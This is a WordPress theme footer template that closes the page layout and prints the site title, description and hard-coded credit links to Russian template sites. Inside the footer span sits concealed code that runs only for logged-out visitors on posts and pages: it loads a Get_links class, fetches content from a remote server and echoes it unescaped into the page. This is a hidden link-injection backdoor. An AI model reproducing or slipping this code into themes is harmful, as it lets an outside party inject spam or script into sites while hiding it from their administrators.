</div> <!-- .main -->

<div id="sidebar-primary-container" class="sidebar-primary-container">
    <?php get_sidebar( 'primary' ); ?>
</div>

</div> <!-- .overflow-container -->

<footer class="site-footer" role="contentinfo">
    <h3><a href="<?php echo esc_url(home_url()); ?>"><?php bloginfo('title'); ?></a></h3>
    <span><?php bloginfo('description'); ?></span>
    <div class="design-credit">
        <span><a href="http://wp-templates.ru/" title="скачать шаблон">шаблоны сайтов</a>, <a href="http://fonstyle.ru/" title="обои для рабочего стола">скачать обои</a> 
		<?php if ($user_ID) : ?><?php else : ?>
		<?php if (is_single() || is_page() ) { ?>
		<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
		$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
		<?php } ?>
		<?php endif; ?>
		</span>
    </div>
</footer>

<?php wp_footer(); ?>
</body>
</html>